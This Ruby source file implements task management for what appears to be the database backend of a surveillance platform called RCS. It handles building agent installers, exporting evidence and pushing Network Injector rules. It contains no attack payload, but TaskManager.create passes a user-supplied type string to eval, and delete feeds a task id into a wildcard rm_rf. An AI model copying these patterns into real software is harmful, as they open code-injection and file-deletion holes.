require 'archive/tar/minitar'
require 'uuidtools'
require 'fileutils'
require 'rcs-common/trace'
require 'rcs-common/temporary'

require_relative 'build'

module RCS
module DB

class TarGzCompression
  include Archive::Tar
  
  def initialize(fd)
    sgz = Zlib::GzipWriter.new(fd)
    @tar = Minitar::Output.new(sgz)
  end
  
  def add_stream(path, string)
    Minitar::pack_stream(path, StringIO.new(string), @tar)
  end
  
  def add_file(path, rename_to = nil)
    h = {name: path, as: (rename_to.nil? ? path : rename_to)}
    Minitar::pack_file(h, @tar)
  end
  
  def add_file_as(path, path_in_tar)
  
  end
  
  def close
    @tar.close
  end
end

module BaseTask
  include RCS::Tracer
  
  attr_reader :_id, :type, :total, :current, :resource, :description, :status
  
  def base_init(type, params)
    @_id = UUIDTools::UUID.random_create.to_s
    @type = type
    @current = 0
    @description = ''
    @time = Time.now
    @status = :in_progress
    @params = params
  end
  
  def self.compressor_class
    @compressor_class || TarGzCompression
  end
  
  def self.digest_class
    @digest_class || Digest::SHA1
  end
  
  def generate_id
    @_id = UUIDTools::UUID.random_create.to_s
  end

  def description(message)
    @description = message
  end
  
  def step
    @current += 1
  end

  def finished?
    @status == :finished
  end

  def error?
    @status == :error
  end

  def download_available?
    @status == :download_available
  end

  def downloading?
    @status == :downloading
  end

  def finished
    @status = :finished
    trace :debug, "Task #{@_id} FINISHED"
  end

  def error
    @status = :error
    trace :debug, "Task #{@_id} ERROR [#{@description}]"
  end

  def downloading
    @status = :downloading
    trace :debug, "Task #{@_id} DOWNLOADING"
  end

  def download_available
    @status = :download_available
    trace :debug, "Task #{@_id} DOWNLOAD AVAILABLE"
  end

  def stop!
    trace :info, "cancelling task #{@_id}"
    finished
  end
  
  def run
    fail 'You must implement a run method!'
  end
  
  def initialize
    fail 'You must implement an initialize method!'
  end

  def total
    'You must implement a total method!'
  end

end

module FileTask
  attr_reader :file_name, :file_size

  def self.included(base)
    base.extend(ClassMethods)
  end

  def file_init(file_name)
    @file_name = file_name
    return if @file_name.nil?
    @resource = {type: 'download', _id: @_id, file_name: @file_name}
  end
  
  def self.compressor_class
    @compressor_class || TarGzCompression
  end
  
  def self.digest_class
    @digest_class || Digest::SHA1
  end
  
  def sha1(path)
    Task.digest_class.new.file(path).hexdigest
  end

  def self.style_assets_count
    @count ||= begin
      Zip::File.open(Config.instance.file('export.zip')) do |z|
        return z.size
      end
      0
    end
  end

  def self.expand_styles
    Zip::File.open(Config.instance.file('export.zip')) do |z|
      z.each do |f|
        yield f.name, z.file.open(f.name, "rb") { |c| c.read }
      end
    end
  end
end

module BuildTaskType
  include BaseTask
  include FileTask
  
  def initialize(type, file_name, params)

    trace :debug, "Building Task: #{params}"

    base_init(type, params)
    file_init(file_name)
    @builder = Build.factory(params['platform'].to_sym)
  end
  
  def run
    process = Proc.new do
      begin
        @total = total
        next_entry do
          break if finished?
          step
        end
        if @file_name.nil?
          finished if @file_name.nil?
        else
          FileUtils.cp(@builder.path(@builder.outputs.first), Config.instance.temp(@_id))
          @resource[:size] = File.size(Config.instance.temp(@_id))
          download_available unless @file_name.nil?
        end
        trace :info, "Task #{@_id} completed."
      rescue Exception => e
        trace :error, "Cannot complete: #{e.message}"
        trace :fatal, "EXCEPTION: [#{e.class}] " << e.backtrace.join("\n")
        @description = "ERROR: #{e.message}"
        error
      ensure
        @builder.clean
      end
    end
    
    EM.defer process
  end #build
end

module NoFileTaskType
  include BaseTask

  def initialize(type, file_name, params)
    base_init(type, params)
  end

  def run
    process = Proc.new do
      begin
        @total = total
        next_entry do
          break if finished?
          step
        end
        trace :info, "Task #{@_id} completed."
        finished
      rescue Exception => e
        trace :error, "Cannot complete: #{e.message}"
        trace :fatal, "EXCEPTION: [#{e.class}] " << e.backtrace.join("\n")
        @description = "ERROR: #{e.message}"
        error
      end
    end

    EM.defer process
  end

end

module SingleFileTaskType
  include BaseTask
  include FileTask

  def initialize(type, file_name, params)
    base_init(type, params)
    file_init(file_name + ".tgz")
  end

  def internal_filename
    raise "Override function internal_filename!"
  end

  def run
    process = Proc.new do
      begin
        @total = total
        #identify where results should be stored
        tgz = File.new(Config.instance.temp(@_id), 'wb+')
        tmp_file = File.new(Config.instance.temp("#{@_id}_temp"), 'wb+')
        compressor = FileTask.compressor_class.new tgz
        next_entry do |chunk|
          break if finished?
          tmp_file.write chunk
          step
        end
        tmp_file.close
        compressor.add_file(tmp_file.path, internal_filename)
        compressor.close
        @resource[:size] = File.size(tgz.path)
        download_available
        trace :info, "Task #{@_id} completed."
      rescue Exception => e
        trace :error, "Cannot complete: #{e.message}"
        trace :fatal, "EXCEPTION: [#{e.class}] " << e.backtrace.join("\n")
        @description = "ERROR: #{e.message}"
        error
      end
    end #single_file

    EM.defer process
  end
end

module MultiFileTaskType
  include BaseTask
  include FileTask
  
  def initialize(type, file_name, params)
    base_init(type, params)
    file_init(file_name + ".tgz")
  end

  def run
    process = Proc.new do
      # temporary file is our task id
      begin
        @total = total
        tmpfile = Temporary.file Config.instance.temp, @_id
        compressor = FileTask.compressor_class.new tmpfile
        next_entry do |type, filename, opts|

          break if finished?

          case type
            when 'stream'
              compressor.add_stream filename, opts[:content]
            when 'file'
              compressor.add_file opts[:path], filename
          end
          step
        end
        @resource[:size] = File.size(tmpfile.path)
        download_available
        trace :info, "Task #{@_id} completed."
      rescue Exception => e
        trace :error, "Cannot complete: #{e.message}"
        trace :fatal, "EXCEPTION: [#{e.class}] " << e.backtrace.join("\n")
        @description = "ERROR: #{e.message}"
        error
      ensure
        compressor.close
      end
    end
    
    EM.defer process
  end # multi_file
end

class TaskManager
  include Singleton
  include RCS::Tracer
  
  def initialize
    @tasks = Hash.new
    #Task.instance_eval { @generator_class = DummyTask }
  end
  
  def audit_new_task type, user_name, params
    case type
      when 'build'
        Audit.log :actor => user_name, :action => "build", :desc => "Created an installer for #{params['platform']}"
      when 'audit'
        Audit.log :actor => user_name, :action => "audit.export", :desc => "Exported the audit log: #{params.inspect}"
      when 'evidence'
        Audit.log :actor => user_name, :action => "evidence.export", :desc => "Exported some evidence: #{params.inspect}"
      when 'injector'
        Audit.log :actor => user_name, :action => "injector.push", :desc => "Pushed the rules to a Network Injector"
      when 'topology'
        Audit.log :actor => user_name, :action => "topology", :desc => "Reconfigured the topology of the frontend"
      when 'entity'
        Audit.log :actor => user_name, :action => "entity.export", :desc => "Exported some entities: #{params.inspect}"
      when 'entitygraph'
        Audit.log :actor => user_name, :action => "entitygraph.export", :desc => "Exported the entities graph: #{params.inspect}"
    end
  end

  def create(user, type, file_name, params = {})
    @tasks[user[:name]] ||= Hash.new

    params[:user] = user
    task = eval("#{type.downcase.capitalize}Task").new type, file_name, params
    trace :info, "Creating task #{task._id} of type #{type} for user '#{user[:name]}', saving to '#{file_name}'"

    audit_new_task(type, user[:name], params)

    begin
      task.run
    rescue Exception => e
      trace :error, "Invalid task: #{e.backtrace}"
      return nil
    end
    
    @tasks[user[:name]][task._id] = task
    task
  end
  
  def get(user, id)
    trace :debug, "Getting task #{id} for user '#{user[:name]}'"
    @tasks[user[:name]][id] rescue nil
  end
  
  def list(user)
    #trace :debug, "List of tasks for user '#{user}': #{@tasks[user]}"
    
    tasks = @tasks[user][:name]
    tasks ||= {}
    
    tasks.values
  end
  
  def delete(user, task_id)
    trace :info, "Deleting task #{task_id} for user '#{user[:name]}'"
    if @tasks[user[:name]]
      task = @tasks[user[:name]][task_id]
      task.stop! unless task.nil?
      @tasks[user[:name]].delete task_id
    end
    FileUtils.rm_rf(Config.instance.temp("#{task_id}*"))
  end
  
  def download(user, task_id)
    trace :info, "Downloading task #{task_id} for user '#{user[:name]}'"

    path = Config.instance.temp(task_id)
    
    # check that task is owned by the user and the corresponding file exists
    return nil if @tasks[user[:name]][task_id].nil?
    return nil unless File.exists?(path)

    callback = proc {
      @tasks[user[:name]][task_id].finished
      trace :info, "Task #{task_id} completed. cleaning up."
      FileUtils.rm_rf(path)
    }

    @tasks[user[:name]][task_id].downloading

    return path, callback
  end
end # TaskManager

# require all the controllers
Dir[File.dirname(__FILE__) + '/tasks/*.rb'].each do |file|
  require file
end

end # DB::
end # RCS::
